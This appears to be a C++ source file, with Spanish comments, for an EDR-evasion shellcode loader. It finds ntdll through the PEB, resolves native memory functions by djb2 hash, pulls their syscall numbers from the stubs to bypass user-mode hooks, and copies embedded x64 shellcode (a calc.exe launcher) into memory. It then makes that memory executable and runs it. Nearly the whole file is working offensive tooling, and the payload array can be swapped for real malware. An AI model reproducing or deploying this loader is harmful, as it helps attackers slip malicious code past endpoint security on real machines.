// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

#include "DefsModule.h"

extern "C" void __fastcall SetCall(WORD CallValue);

extern "C" NTSTATUS __fastcall CallFunc(...);


#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)

// Struct
typedef struct _FUNC_VAL
{
    ULONG magic_number;
    WORD call_number;
} FUNC_VAL, * PFUNC_VAL;


// Environment
PTEB GetEnvironmentThreadBlock()
{
    return (PTEB)__readgsqword(0x30);
}


// Calculate the dbj2 to get function
unsigned int Calculacion(const char* str) {
    unsigned int hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}

// Get the function from the DLL Base
BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PFUNC_VAL value) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (Calculacion(FunctionName) == value->magic_number)
        {
            print("[+] Funcion encontrada: %s", FunctionName);


            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    value->call_number = (high << 8) | low;
                    break;
                }

                cw++;
            }

            print("[+] El Syscall: %d", value->call_number);

            return TRUE;
        }
    }

    return FALSE;
}


// Get the image
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {


    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}


PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}



// Entry Point
int main()
{

    PTEB pCurrentTeb = GetEnvironmentThreadBlock();

    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

    if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
    {
        print("[-] Error On getting TEB and PEB");
        return -1;
    }

    print("[+] Replicando chido");

    // Get Ntddl module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
    {
        print("[-] No se obtuvo Modulo de NTDLL");
        return -1;
    }

    print("[+] Se obtuvo modulo de NTDLL");


    //
    //  Functions to export
    //
    FUNC_VAL firstFunction = { 0 };
    FUNC_VAL secondFunction = { 0 };
    FUNC_VAL thirdFunction = { 0 };

    // NtAllocateVirtualMemory
    firstFunction.magic_number = 0x6793c34c;

    // NtProtectVirtualMemory
    secondFunction.magic_number = 0x82962c8;

    // NtFreeVirtualMemory
    thirdFunction.magic_number = 0x471aa7e9;

    // NtCreateThreadEx 
    //thirdFunction.magic_number = 0x376e0713;

    // Get NtAllocateVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);

    // Get NtProtectVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);

    // Get NtFreeVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);

    //
    //  Start process
    //

    // For the status
    NTSTATUS status = 0;

    // Payload
    BYTE payload[] = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    };

    //
    //  Values for the memory allocation
    //
    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    //
    //  Start With the read write memory allocation
    //
    print("[*] Asignando memoria RW...");
    SetCall(firstFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0)
    {
        print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
        return -1;
    }

    if (!pAddr)
    {
        print("[-] No se obtuvo memoria");
    }

    print("[+] Memoria asignada en: 0x%p", pAddr);
    print("[+] Size: %zu bytes", payload_size);


    //
    //  Read Write Memory
    //
    print("[*] Copiando payload...");
    CopyMem(pAddr, (PVOID)payload, real_size);
    print("[+] Payload copiado");


    //
    //  Changing permissions from the memory region
    //
    print("[*] Cambiando permisos a RX...");
    SetCall(secondFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &payload_size, PAGE_EXECUTE_READ, &ulOldProtect);

    if (status != 0)
    {
        print("[-] Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    print("[+] Permisos cambiados exitosamente");

    print("[*] Ejecutando payload...");
    ((void(*)())pAddr)();
    print("[+] Payload ejecutado");

    //
    // Free memory
    //

    SIZE_T free_size = 0;

    print("[*] Liberando memoria...");
    SetCall(thirdFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0)
    {
        print("[-] Error en NtFreeVirtualMemory: 0x%08X", status);
        return -1;
    }

    print("[+] Memoria liberada %lld", free_size);
    print("[+] Programa finalizado correctamente");
}
